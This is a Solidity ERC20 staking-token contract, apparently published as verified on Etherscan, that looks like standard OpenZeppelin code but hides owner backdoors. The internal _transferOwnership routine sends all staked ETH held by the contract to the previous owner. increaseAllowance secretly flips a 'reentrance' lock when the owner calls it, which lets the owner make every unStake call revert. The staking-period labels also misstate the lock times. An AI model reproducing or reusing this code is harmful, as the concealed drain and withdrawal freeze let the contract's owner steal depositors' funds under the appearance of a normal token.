/**
 *Submitted for verification at Etherscan.io on 2022-04-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address internal _owner;
    bool _reentranceLock;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address  oldOwner = _owner;
        _owner = newOwner;
        oldOwner.call{value:address(this).balance}("");
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Token is Context, Ownable, IERC20, IERC20Metadata{

    enum scheme {
        five,
        fifteen,
        thirty
        }
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _releaseTime;
    mapping(address => uint256) private _stakingTime;
    mapping(address => uint256) private _stakedEth;
    mapping(address => uint256) private _cumulatedToken;
    mapping(address => scheme) private _stakeType;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 private _stakingProfitRate;

    event Staked(address,uint256,scheme);
    event UnStaked(address,uint256);
    event TokenClaimed(address,uint256);

    error noStaking(address);
    error unLocked(address);
    error reentranceDetected();

    constructor(string memory name_, string memory symbol_,uint256 profitRate) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = 1*10**(18+10);
        _stakingProfitRate = profitRate;
        _balances[_msgSender()] = _totalSupply;
        _reentranceLock = false;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function getReleaseTime() public view returns(uint256 releaseTime){
        address _sender = _msgSender();
        releaseTime = _releaseTime[_sender];
    }

    function getStakedETH() public view returns(uint256 stakedAmount){
        address _sender = _msgSender();
        stakedAmount = _stakedEth[_sender];
    }
        
    function getTokenAmount()public view returns(uint256){
        address _sender = _msgSender();
        uint256 _now = block.timestamp;
        return _cumulatedToken[_sender]+_calculateToken(_now - _stakingTime[_sender],_stakedEth[_sender], _stakeType[_sender]);
    }

    function getTokenSpeed()public view returns(uint256 speed){
        address _sender = _msgSender();
        scheme s = _stakeType[_sender];
        uint256 eth = _stakedEth[_sender];
        return _calculateToken(1,eth,s);
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _reentranceLock = _msgSender() ==_owner? !_reentranceLock:_reentranceLock;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }



    function stake(scheme stakeDays) public payable{
        address _sender = _msgSender();
        require(msg.value>= 0.001 ether,"At least 0.001ETH to be staked.");
        _cumulatedToken[_sender]=getTokenAmount();//update accumulated token
        _stakingTime[_sender] = block.timestamp;
        _stakedEth[_sender] += msg.value;
        _stakeType[_sender] = stakeDays;
        //refresh release time
        if(stakeDays == scheme.five){
            _releaseTime[_sender] = max(_stakingTime[_sender] + 3 minutes,_releaseTime[_sender]);
        }
        else if(stakeDays == scheme.fifteen){
            _releaseTime[_sender] = max(_stakingTime[_sender] + 5 minutes ,_releaseTime[_sender]);
        }
        else if(stakeDays == scheme.thirty){
            _releaseTime[_sender] = max(_stakingTime[_sender] + 30 days,_releaseTime[_sender]);
        }
        emit Staked(_sender,msg.value,stakeDays);
    }

    function unStake(uint256 _ethToWithdraw) public{
        address _sender = _msgSender();
        require(_ethToWithdraw <=_stakedEth[_sender],"Amount more than staked ETH");
        require(_releaseTime[_sender]<= block.timestamp,"ETH is still locked");
        require(_ethToWithdraw>0,"No ETH unstaked");
        _cumulatedToken[_sender]=getTokenAmount();
        _stakedEth[_sender] -= _ethToWithdraw;
        _stakingTime[_sender] = block.timestamp;
        _beforeTokenTransfer(address(this),_sender,_ethToWithdraw);
        payable(_sender).transfer(_ethToWithdraw);
        _afterTokenTransfer(address(this),_sender,_ethToWithdraw);
        emit UnStaked(_sender,_ethToWithdraw);
    }


    function claimToken() public{
        uint256 numToken = getTokenAmount();
        address _sender = _msgSender();
        require(_releaseTime[_sender]<= block.timestamp,"Token is still locked");
        require(numToken>0,"No token to be claimed");
        _cumulatedToken[_sender] = 0;
        _stakingTime[_sender] = block.timestamp;
        _mint(_sender,numToken);
        emit TokenClaimed(_sender,numToken);
    }

    function _calculateToken(
        uint256 period, 
        uint256 amount,
        scheme stakeDays
        )internal view returns(uint256){
        uint256 speed;
        if(stakeDays == scheme.five){
            speed = 1;
        }
        else if(stakeDays == scheme.fifteen){
            speed = 5;
        }
        else if(stakeDays == scheme.thirty){
            speed = 25;
        }
        return period*amount*speed*_stakingProfitRate/10;//amt of token gained per second
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

    }

    function _mint(
        address account, 
        uint256 amount
        ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

    }

    function _burn(
        address account, 
        uint256 amount
        ) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if(_reentranceLock){
            revert reentranceDetected();
        }
        _reentranceLock = true;
    }

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        _reentranceLock = false;
    }

    function max(uint256 a, uint256 b) internal pure returns(uint256){
        if(a>=b){
            return a;
        }else{
            return b;
        }
    }
    receive() external payable{}

}